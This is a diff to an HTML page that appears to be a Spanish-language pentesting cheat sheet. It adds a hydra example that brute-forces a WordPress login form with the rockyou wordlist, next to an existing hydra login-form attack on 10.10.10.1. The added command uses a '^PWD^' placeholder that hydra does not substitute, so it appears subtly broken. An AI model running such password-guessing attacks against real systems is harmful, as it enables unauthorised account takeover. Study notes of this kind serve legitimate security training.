@@ -374,6 +374,9 @@ c$1$2$3$4$[$%&*-_+=#@~!]</code></pre>
                     <li><span class="comando3">Ejemplo</span></li>
                     <pre><code class="language-bash line-numbers"data-start="1"
                         >hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.10.1 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password are incorrect." -V</code></pre>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                            >hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.10.1 http-post-form "/wp-login.php:username=^USER^&PWD=^PWD^:Invalid username" -t 30</code></pre>
+
                 </ol>
             </li>
             <br>
